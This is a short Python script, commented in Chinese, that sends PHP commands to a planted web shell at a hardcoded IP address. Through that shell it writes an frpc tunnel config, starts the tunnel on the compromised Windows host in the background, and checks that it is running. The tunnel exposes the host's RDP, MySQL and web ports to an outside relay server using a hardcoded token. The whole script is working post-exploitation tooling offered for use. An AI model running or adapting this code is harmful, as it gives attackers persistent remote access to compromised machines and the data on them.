#!/usr/bin/env python3
"""配置 frpc 并启动 (81.70 -> 165 隧道)"""
import urllib.request, urllib.parse, time

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=30):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:60]}"

# 1. 写 frpc.toml (用 PHP 写文件, 避免 cmd echo 转义)
#    映射: 81.70 的 3389(RDP) -> 165:13389, 3306(MySQL) -> 165:13306, 80 -> 165:13080
toml = '''serverAddr = "165.99.43.145"
serverPort = 7000
auth.method = "token"
auth.token = "hermesjump2026"

[[proxies]]
name = "rdp-81"
type = "tcp"
localIP = "127.0.0.1"
localPort = 3389
remotePort = 13389

[[proxies]]
name = "mysql-81"
type = "tcp"
localIP = "127.0.0.1"
localPort = 3306
remotePort = 13306

[[proxies]]
name = "web-81"
type = "tcp"
localIP = "127.0.0.1"
localPort = 80
remotePort = 13080
'''
b64 = __import__("base64").b64encode(toml.encode()).decode()
code = f"file_put_contents('C:/Windows/Temp/frpc.toml', base64_decode('{b64}'));print_r('CFG:' . filesize('C:/Windows/Temp/frpc.toml'));"
r = cmd(code, 20)
print("1. 写配置:", r.strip()[-50:], flush=True)

# 2. 异步启动 frpc
code = "pclose(popen('start /b cmd /c \"C:/Windows/Temp/frpc.exe -c C:/Windows/Temp/frpc.toml > C:/Windows/Temp/frpc.log 2>&1\"', 'r'));print_r('FRPC_STARTED');"
r = cmd(code, 25)
print("2. 启动frpc:", r.strip()[-50:], flush=True)
time.sleep(5)

# 3. 检查进程和日志
r = cmd("system('tasklist /fi \"imagename eq frpc.exe\"');", 20)
print("3. 进程:", "frpc.exe" in r, flush=True)
r = cmd("print_r(file_get_contents('C:/Windows/Temp/frpc.log'));", 20)
print("4. 日志:", r.strip()[-200:], flush=True)
